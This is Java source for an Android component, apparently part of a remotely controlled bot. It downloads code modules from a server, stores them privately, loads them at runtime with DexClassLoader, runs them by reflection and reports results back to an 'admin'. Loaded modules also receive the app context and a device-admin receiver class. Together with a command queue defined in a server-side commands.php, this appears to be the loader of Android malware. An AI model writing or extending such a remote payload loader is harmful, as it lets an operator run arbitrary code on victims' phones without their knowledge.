package com.moonny;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Looper;
import android.util.Log;

import com.moonny.api.APIHandlerFactory;
import com.moonny.api.ApiRequest;
import com.moonny.api.Callback;
import com.moonny.api.RequestResult;
import com.moonny.rcvs.AdminRightsReceiver;
import com.moonny.constants.Constant;
import com.moonny.constants.S;
import com.moonny.helpers.Utils;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Locale;

import dalvik.system.DexClassLoader;

public class Modules {
    final String TAG = S.Modules;

    private String mods_dir = null;
    private int task_id = 0;
    Context ctx;

    public Modules(Context ctx)
    {
        this.ctx = ctx;
        File d;
//        if(Constant.DEBUG)
//            d = new File(Environment.getExternalStorageDirectory().getAbsolutePath(), "TEST"); // SD card root directory = for tests
//        else
            d = new File(ctx.getApplicationInfo().dataDir, "m");

        d.mkdir();
        mods_dir = d.getPath();
    }

    public String get_path(String module)
    {
        return mods_dir + "/" + Utils.md5(module) + S.dex;
    }

    // (имена модулей определены в commands.php)
    public boolean is_mod_exists(String module, String md5)
    {
        String path = get_path(module);
        File file = new File(path);
        if(!file.exists()) {
            if(Constant.DEBUG) Log.d(TAG, "Mod " + path + " DOES NOT EXISTS");
            return false;
        }

        if(!md5.isEmpty() && !md5.equals(Utils.md5_file(path))) {
            if(Constant.DEBUG) Log.d(TAG, "Wrong md5 " + md5 + " for file " + path);
            delete_mod(module);
            return false;
        }

//        if(Constant.DEBUG) Log.d(TAG, "Mod "+module+" exists in " + file.getPath());

        return true;
    }

    // without hash check
    public boolean is_mod_exists(String module)
    {
        return is_mod_exists(module, "");
    }

    public void delete_mod(String module)
    {
        try {
            if(Constant.DEBUG) Log.d(TAG, "Deleting module " + module);
            new File(get_path(module)).delete();
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    public void download_mod(String module) {

        String binary_path = get_path(module);

        if(Constant.DEBUG) Log.d(TAG, "Downloading module " + module + " to " + binary_path);

        JSONObject json = new JSONObject();

        try {
            json.put(S.api_module, module);
            json.put(S.api_method, S.api_get_module);
        } catch (JSONException e) {
            e.printStackTrace();
            return;
        }

        ApiRequest ar = new ApiRequest(ctx, json, new Callback() {
            public void callb(RequestResult result) {

                if(Constant.DEBUG) Log.d("DownloadModuleListener", "module downloaded, run parse_new_tasks()");

                APIHandlerFactory.process_tasks(ctx,
                        new Tasks(ctx, S.dynmod_queue_file),
                        new Modules(ctx)); // process only tasks from queue
            }
        });

        if(!binary_path.isEmpty())
            ar.setBinaryMode(binary_path);

        ar.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
    }

    public static Object main(Context ctx, String function_name, Object[] params)
    {
        if(params == null)
            params = new Object[]{};

        Modules m = new Modules(ctx);

        if(!m.is_mod_exists(S.main)) {
            if(Constant.DEBUG) Log.e("Modules", "main: mod Main not found!");
            return null;
        }

        String path = m.get_path(S.main);

        // getting types of all params
        Class[] args = null;

        args = new Class[params.length];

        int i = 0;
        for (Object param : params) {
            if(param == null)
            {
                if(Constant.DEBUG) Log.e("Modules", "Param for dynamic method is null!");
                return null;
            }
            args[i] = param.getClass();
            i++;
        }

        Object result = null;
        if(S.get_pref.equals(function_name) && params.length != 0) // for Prefs.get_ref last parameter is default value
            result = params[params.length-1];

        DexClassLoader classLoader = new DexClassLoader(path, ctx.getApplicationInfo().dataDir, null, ctx.getClass().getClassLoader());

        try {
            // get class
            Class<?> cls = classLoader.loadClass(S.dynam_module_class + m.capitalize(S.main)); // <<<--- class name should be the same with mod name!
            Object mainclass = cls.getDeclaredConstructor(HashMap.class).newInstance(m.get_system_data());
            // all custom funcs take Object[] param with args

            result = mainclass.getClass().getDeclaredMethod(function_name, args).invoke(mainclass, params);

        }catch (Exception e) {
            if(Constant.DEBUG) {
                Log.d("Module", "Execute method "+function_name+" of module Main failed: " + e.getMessage());
                e.printStackTrace();
            }
            m.delete_mod(S.main);
        }

        return result;
    }

    // no params
    public Object run_func(String module, String function_code) throws Exception
    {
        return run_func(module, function_code, null);
    }

    // to run methods from Main
    public Object run_func(String module, String function_name, Object[] params) throws Exception
    {
        if(module.isEmpty())
            return new Object(){}.getClass().getEnclosingMethod().getName(); // should return run_func

        String path = get_path(module);
        if(Constant.DEBUG)
        {
            String p = (params != null)? params.toString() : "";
            Log.d(TAG, "Run_func dynamic module `" + module + "`; function `" + function_name + "` with params `" + p + "` from path: " + path);
            File file = new File(path);
            if(file.exists()) {
                Log.d(TAG, "Module is file: " + file.isFile() + "; size: " + file.length());
            }else{
                Log.d(TAG, "Module not found");
            }
        }

        Object result = null;

        DexClassLoader classLoader = new DexClassLoader(path, ctx.getApplicationInfo().dataDir, null, getClass().getClassLoader());

        // get class
        Class<?> cls = classLoader.loadClass(S.dynam_module_class + capitalize(module)); // <<<--- class name should be the same with mod name!
        Object mainclass = cls.getDeclaredConstructor(HashMap.class).newInstance(get_system_data());

        // getting types of all params
        Class[] args = null;

        if(params != null) {
            args = new Class[params.length];

            int i = 0;
            for (Object param : params) {
                args[i] = param.getClass();
                i++;
            }
        }
        // all custom funcs take Object[] param with args
        result = mainclass.getClass().getDeclaredMethod(function_name, args)
                .invoke(mainclass, params);

        if(Constant.DEBUG) Log.d("RunTest", "RESULT OF INVOKE: " + result);

        return result;
    }

    public String api_request(JSONObject json, final String module, final String callback_name)
    {
        if(json == null)
            return new Object(){}.getClass().getEnclosingMethod().getName(); // should return api_request name

        Callback clb = null;
        if(!module.isEmpty() && !callback_name.isEmpty()) {
            clb = new Callback() {
                @Override
                public void callb(RequestResult result) {
                    if (Constant.DEBUG) Log.d("Api2", "call Main.Callback from Modules.api_request");
                    try {
                        run_func(module, callback_name, new Object[]{result.getCode(), result.getResponse()});
                    } catch (Exception e) {
                        if (Constant.DEBUG) {
                            Log.d("Api2", "error call module callback: " + e.getMessage());
                            e.printStackTrace();
                        }

                    }
                }
            };
        }

        new ApiRequest(ctx, json, clb).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
        return "";
    }

    public HashMap get_system_data()
    {
        HashMap<String, Object> system = new HashMap<>();
        system.put(S.api_sys_ver, 100);
        system.put(S.api_sys_ctx, ctx);
        system.put(S.api_sys_modules_class, new Modules(ctx));
        try {
            system.put(S.api_sys_runfunc_name, run_func("", "")); // get final function name to call it from a module
            system.put(S.api_request_func, api_request(null, "", "")); // get final function name to call it from a module
        }catch (Exception e){
            e.printStackTrace();
        }

        system.put(S.api_AdminRightsReceiver_class, AdminRightsReceiver.class);
        system.put(S.api_ApiRequest_class, ApiRequest.class);

        return system;
    }

    // shit -> Shit
    public String capitalize(String text)
    {
        // return text.substring(0, 1).toUpperCase() + text.substring(1);
        return Character.toString(text.charAt(0)).toUpperCase(Locale.ENGLISH)+text.substring(1);
    }

    public void run_async(int task_id, String module, JSONObject params)
    {
        ModuleRunTask deliveryTask = new ModuleRunTask(task_id, module, params);
        deliveryTask.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
    }

    private class ModuleRunTask extends AsyncTask<Void, Void, Void> {
        private final int task_id;
        private final String module;
        private final JSONObject run_params;
        private final JSONObject result;

        private ModuleRunTask(int task_id, String module, JSONObject run_params) {
            this.task_id = task_id;
            this.module = module;
            this.run_params = run_params;
            this.result = new JSONObject();
        }

        @Override
        protected Void doInBackground(Void... params) {

            if(Looper.myLooper() == null)
                Looper.prepare();

            String path = get_path(module);
            if(Constant.DEBUG)
            {
                Log.d(TAG, "Run dynamic module " + module + " with params " + run_params.toString() + " from path: " + path);
                File file = new File(path);
                if(file.exists()) {
                    Log.d(TAG, "Module is file: " + file.isFile() + "; size: " + file.length());
                }else{
                    Log.d(TAG, "Module not found");
                }
            }

            DexClassLoader classLoader = new DexClassLoader(path, ctx.getApplicationInfo().dataDir, null, getClass().getClassLoader());

            try {
                result.put(S.api_method, S.api_send_result);
                result.put(S.api_task_id, task_id);

                Class<?> cls = classLoader.loadClass(S.dynam_module_class + capitalize(module)); // com.dynam. + "Class"

                Object moduleClass = cls.getConstructor(HashMap.class).newInstance(get_system_data());

                int mod_ver_requirement = moduleClass.getClass().getDeclaredField(S.MAIN_VER_REQUIRED).getInt(moduleClass);
                int main_ver = (int) run_func(S.main, S.get_main_version);

                if(Constant.DEBUG) Log.d(TAG, "Main ver is " + main_ver + "; mod '" +module+ "' requires " + mod_ver_requirement);

                if(main_ver < mod_ver_requirement)
                {
                    if(Constant.DEBUG) Log.d(TAG, "Module is not compatible with current Main lib");

                    result.put(S.api_status, false);
                    result.put(S.api_response, S.api_err_no_compatible);
                    return null;
                }

                Method runMethod = moduleClass.getClass().getDeclaredMethod(S.dynam_module_method, run_params.getClass()); // run with JSONObject
                if(runMethod == null)
                {
                    if(Constant.DEBUG) Log.d(TAG, "No method run in the mod " + module);
                    result.put(S.api_status, false);
                    result.put(S.api_response, S.api_err_bad_mod);
                    return null;
                }

                JSONObject mod_result = (JSONObject) runMethod.invoke(moduleClass, run_params);
                if(mod_result != null) {
                    Iterator i = mod_result.keys();
                    while (i.hasNext()) {
                        String key = (String) i.next();
                        result.put(key, mod_result.get(key));
                    }
                }

            } catch (Exception e) {
                if(Constant.DEBUG) {
                    Log.d(TAG, "Dynamic module " +module+ " failed: " + e.getMessage());
                    e.printStackTrace();
                }

                try {
                    result.put(S.api_status, false);

                    StringWriter sw = new StringWriter();
                    PrintWriter pw = new PrintWriter(sw);
                    e.printStackTrace(pw);

                    String stacktrace = sw.toString(); // stack trace as a string

                    result.put(S.api_response, e.getMessage() + "\n" + stacktrace);

                }catch (Exception e2){
                    if(Constant.DEBUG) {
                        Log.d(TAG, "Dynamic module " +module+ " exception failed: " + e2.getMessage());
                        e2.printStackTrace();
                    }
                }

            }

            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);

            // Send json result (of mod.run execution) back to admin
            try {
                if(!result.has(S.api_status))
                    result.put(S.api_status, true);

                if(!result.has(S.api_response))
                    result.put(S.api_response, "");

                JSONObject data = new JSONObject();

                Iterator i = result.keys();
                while(i.hasNext())
                {
                    String key = (String) i.next();
                    try {
                        data.put(key, result.get(key));
                    }catch (JSONException e){
                        if(Constant.DEBUG) Log.d(TAG, "SendResult key " +key+ " exception: " + e.getMessage());
                        e.printStackTrace();
                    }
                }

                new ApiRequest(ctx, data).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);

            }catch (Exception e2)
            {
                Log.d(TAG, "Dynamic module " +module+ " sendResult failed: " + e2.getMessage());
                e2.printStackTrace();
            }
        }
    }

}

